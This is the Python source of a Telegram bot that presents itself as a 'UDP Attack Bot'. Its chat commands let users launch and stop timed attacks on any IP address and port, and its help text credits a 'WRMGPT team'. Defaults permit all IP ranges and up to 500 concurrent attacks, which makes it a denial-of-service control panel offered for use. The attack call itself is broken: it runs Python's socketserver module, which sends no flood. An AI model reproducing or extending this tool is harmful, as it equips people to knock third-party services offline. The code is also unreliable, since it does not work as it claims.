import telebot
import subprocess
import yaml
import os
import signal
import sys
from datetime import datetime

# Load bot token from environment variable
BOT_TOKEN = os.getenv('TELEGRAM_BOT_TOKEN')

# Initialize the bot if token is available
if BOT_TOKEN:
    bot = telebot.TeleBot(BOT_TOKEN)
else:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is not set")

def load_attack_config(config_path='attack_config.yaml'):
    """Load attack configuration from YAML file."""
    try:
        with open(config_path, 'r') as file:
            config = yaml.safe_load(file)
        return config
    except FileNotFoundError:
        print(f"Configuration file {config_path} not found. Using defaults.")
        return get_default_config()

def get_default_config():
    """Return default attack configuration."""
    return {
        'attack': {
            'default_duration': 60,
            'default_packet_size': 10240,
            'max_concurrent_attacks': 500
        },
        'network': {
            'default_port': 20000,
            'allowed_ip_ranges': ['0.0.0.0/0']
        },
        'logging': {
            'enabled': True,
            'level': 'INFO'
        }
    }

def start_attack(ip=None, port=None, duration=None):
    """Initiate a UDP attack with specified or default parameters."""
    config = load_attack_config()

    # Use provided parameters or fall back to defaults
    target_ip = ip if ip else config.get('network', {}).get('default_ip', '127.0.0.1')
    target_port = port if port else config.get('network', {}).get('default_port', 20000)
    attack_duration = duration if duration else config.get('attack', {}).get('default_duration', 60)

    # Log attack initiation
    log_attack_start(target_ip, target_port, attack_duration)

    # Execute UDP attack command
    try:
        process = subprocess.Popen(
            ['python', '-m', 'socketserver', 'UDP', str(target_port), '--host', target_ip],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )

        # Monitor attack process
        attack_id = generate_attack_id()
        log_attack_status(attack_id, 'running', target_ip, target_port)

        return {
            'status': 'success',
            'attack_id': attack_id,
            'target_ip': target_ip,
            'target_port': target_port,
            'duration': attack_duration,
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        error_msg = f"Failed to start attack: {str(e)}"
        log_attack_status(None, 'error', target_ip, target_port, error_msg)
        return {
            'status': 'error',
            'message': error_msg,
            'target_ip': target_ip,
            'target_port': target_port
        }

def stop_attack(attack_id=None):
    """Stop an active UDP attack."""
    try:
        # Send termination signal to attack processes
        subprocess.run(
            ['pkill', '-f', 'UDP'],
            capture_output=True,
            text=True
        )

        log_attack_stop(attack_id)

        return {
            'status': 'success',
            'message': f"Attack {attack_id} stopped successfully",
            'timestamp': datetime.now().isoformat()
        }
    except Exception as e:
        return {
            'status': 'error',
            'message': f"Failed to stop attack: {str(e)}",
            'attack_id': attack_id
        }

def generate_attack_id():
    """Generate a unique attack identifier."""
    timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
    import random
    random_suffix = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))
    return f"ATK-{timestamp}-{random_suffix}"

def log_attack_start(ip, port, duration):
    """Log attack initiation details."""
    config = load_attack_config()
    if config.get('logging', {}).get('enabled', True):
        log_entry = {
            'event': 'ATTACK_START',
            'timestamp': datetime.now().isoformat(),
            'target_ip': ip,
            'target_port': port,
            'duration_seconds': duration,
            'config_version': config.get('version', '1.0')
        }
        write_log_entry(log_entry)

def log_attack_stop(attack_id):
    """Log attack completion."""
    config = load_attack_config()
    if config.get('logging', {}).get('enabled', True):
        log_entry = {
            'event': 'ATTACK_STOP',
            'timestamp': datetime.now().isoformat(),
            'attack_id': attack_id,
            'status': 'completed'
        }
        write_log_entry(log_entry)

def log_attack_status(attack_id, status, ip, port, message=None):
    """Log attack status updates."""
    config = load_attack_config()
    if config.get('logging', {}).get('enabled', True):
        log_entry = {
            'event': 'ATTACK_STATUS',
            'timestamp': datetime.now().isoformat(),
            'attack_id': attack_id,
            'status': status,
            'target_ip': ip,
            'target_port': port,
            'message': message
        }
        write_log_entry(log_entry)

def write_log_entry(log_entry):
    """Write a log entry to the log file."""
    config = load_attack_config()
    log_file = config.get('logging', {}).get('file', 'attack.log')

    try:
        with open(log_file, 'a') as f:
            import json
            f.write(json.dumps(log_entry) + '\n')
    except Exception as e:
        print(f"Logging error: {str(e)}")

# Bot Command Handlers

@bot.message_handler(commands=['start'])
def send_welcome(message):
    """Handle /start command - display bot capabilities."""
    welcome_text = (
        "🤖 *Welcome to the UDP Attack Bot!*\n\n"
        "I can help you manage UDP attacks with the following commands:\n\n"
        "• `/start_attack` - Initiate a new UDP attack\n"
        "• `/stop_attack` - Stop an active attack\n"
        "• `/status` - Check current attack status\n"
        "• `/config` - View attack configuration\n"
        "• `/help` - Display this help message\n\n"
        "Send `/start_attack IP PORT DURATION` to begin an attack.\n"
    )
    bot.reply_to(message, welcome_text, parse_mode='Markdown')

@bot.message_handler(commands=['start_attack'])
def handle_start_attack_command(message):
    """Handle /start_attack command with optional parameters."""
    args = message.text.split()[1:]

    if len(args) >= 3:
        ip = args[0]
        port = int(args[1])
        duration = int(args[2])
        result = start_attack(ip=ip, port=port, duration=duration)
    elif len(args) == 2:
        ip = args[0]
        port = int(args[1])
        result = start_attack(ip=ip, port=port)
    elif len(args) == 1:
        ip = args[0]
        result = start_attack(ip=ip)
    else:
        result = start_attack()

    if result['status'] == 'success':
        response = (
            f"✅ *Attack Started Successfully*\n\n"
            f"📋 Attack Details:\n"
            f"• ID: `{result['attack_id']}`\n"
            f"• Target IP: `{result['target_ip']}`\n"
            f"• Target Port: `{result['target_port']}`\n"
            f"• Duration: {result['duration']} seconds\n"
            f"• Started: {result['timestamp']}\n\n"
            f"Use `/stop_attack` to terminate this attack."
        )
    else:
        response = (
            f"❌ *Attack Failed*\n\n"
            f"📋 Error Details:\n"
            f"• Message: {result['message']}\n"
            f"• Target IP: {result.get('target_ip', 'N/A')}\n"
            f"• Target Port: {result.get('target_port', 'N/A')}"
        )

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['stop_attack'])
def handle_stop_attack_command(message):
    """Handle /stop_attack command."""
    args = message.text.split()[1:]

    if args:
        attack_id = args[0]
    else:
        attack_id = None

    result = stop_attack(attack_id=attack_id)

    if result['status'] == 'success':
        response = (
            f"✅ *Attack Stopped*\n\n"
            f"📋 Stop Details:\n"
            f"• Status: {result['message']}\n"
            f"• Stopped At: {result['timestamp']}"
        )
    else:
        response = (
            f"❌ *Stop Failed*\n\n"
            f"📋 Error Details:\n"
            f"• Message: {result['message']}\n"
            f"• Attack ID: {result.get('attack_id', 'N/A')}"
        )

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['status'])
def handle_status_command(message):
    """Handle /status command - display current attack information."""
    config = load_attack_config()

    response = (
        f"📊 *Current Attack Status*\n\n"
        f"⚙️ Configuration:\n"
        f"• Default Duration: {config.get('attack', {}).get('default_duration', 60)}s\n"
        f"• Default Port: {config.get('network', {}).get('default_port', 8080)}\n"
        f"• Max Concurrent: {config.get('attack', {}).get('max_concurrent_attacks', 5)}\n\n"
        f"📈 System Info:\n"
        f"• Uptime: Active\n"
        f"• Logging: {'Enabled' if config.get('logging', {}).get('enabled') else 'Disabled'}\n"
        f"• Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['config'])
def handle_config_command(message):
    """Handle /config command - display full configuration."""
    config = load_attack_config()

    response = (
        f"🔧 *Attack Configuration*\n\n"
        f"🎯 Attack Settings:\n"
        f"• Duration: {config.get('attack', {}).get('default_duration', 60)}s\n"
        f"• Packet Size: {config.get('attack', {}).get('default_packet_size', 1024)} bytes\n"
        f"• Max Concurrent: {config.get('attack', {}).get('max_concurrent_attacks', 5)}\n\n"
        f"🌐 Network Settings:\n"
        f"• Default Port: {config.get('network', {}).get('default_port', 8080)}\n"
        f"• IP Ranges: {config.get('network', {}).get('allowed_ip_ranges', [])}\n\n"
        f"📝 Logging:\n"
        f"• Enabled: {config.get('logging', {}).get('enabled', True)}\n"
        f"• Level: {config.get('logging', {}).get('level', 'INFO')}"
    )

    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def handle_help_command(message):
    """Handle /help command - display comprehensive help."""
    help_text = (
        "📚 *UDP Attack Bot - Help Guide*\n\n"
        "🚀 *Getting Started*\n"
        "Use `/start` to see available commands.\n\n"
        "⚡ *Attack Commands*\n"
        "• `/start_attack` - Start a new UDP attack with default settings\n"
        "• `/start_attack IP` - Start attack targeting specific IP\n"
        "• `/start_attack IP PORT` - Start with IP and port specification\n"
        "• `/start_attack IP PORT DURATION` - Full parameter control\n\n"
        "🛑 *Management*\n"
        "• `/stop_attack` - Stop all active attacks\n"
        "• `/stop_attack ATTACK_ID` - Stop specific attack\n"
        "• `/status` - View current attack status\n"
        "• `/config` - Display configuration details\n\n"
        "💡 *Examples*\n"
        "`/start_attack 192.168.1.100 8080 120`\n"
        "Starts attack on 192.168.1.100:8080 for 120 seconds.\n\n"
        "Need more help? Contact the WRMGPT team!"
    )

    bot.reply_to(message, help_text, parse_mode='Markdown')

def signal_handler(sig, frame):
    """Handle graceful shutdown signals."""
    print("\n🔔 Shutting down bot gracefully...")
    stop_attack()
    print("✅ Bot stopped successfully.")
    sys.exit(0)

def main():
    """Main entry point for the bot."""
    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("🚀 Starting UDP Attack Bot...")
    print(f"📡 Bot initialized with token: {BOT_TOKEN[:10]}...{BOT_TOKEN[-4:]}")

    try:
        # Start the bot polling loop
        print("🔄 Bot is now polling for messages...")
        bot.infinity_polling(timeout=10, long_polling_timeout=20)
    except KeyboardInterrupt:
        signal_handler(None, None)
    except Exception as e:
        print(f"❌ Bot error: {str(e)}")
        sys.exit(1)

if __name__ == '__main__':
    main()
    
